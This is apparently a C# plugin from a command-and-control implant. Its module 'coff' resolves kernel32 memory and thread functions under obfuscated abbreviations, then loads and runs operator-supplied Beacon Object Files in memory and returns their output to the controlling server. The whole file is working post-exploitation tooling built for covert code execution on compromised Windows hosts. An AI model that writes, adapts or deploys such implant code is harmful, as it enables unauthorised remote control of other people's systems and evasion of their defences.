using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using Invoker.Dynamic;
namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "coff";
        private IMessageManager messageManager { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
        }
        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                List<string> k32funcs = new List<string>()
                {
                    "va",
                    "vf",
                    "gph",
                    "ha",
                    "zm",
                    "hf",
                    "ll",
                    "gpa",
                    "ct",
                    "gect",
                    "wfso",
                    "vp",
                };

                if (!Resolver.TryResolveFuncs(k32funcs, "k32", out var err)){
                    await messageManager.WriteLine(err, job.task.id, true, "error");
                }

                BofRunner br = new BofRunner(args);
                br.LoadBof();

                BofRunnerOutput bro = br.RunBof(60);
                await messageManager.Write(bro.Output + Environment.NewLine + $"Exit Code: {bro.ExitCode}", job.task.id, true);
            }
            catch (Exception e)
            {
                await messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }
    }
}
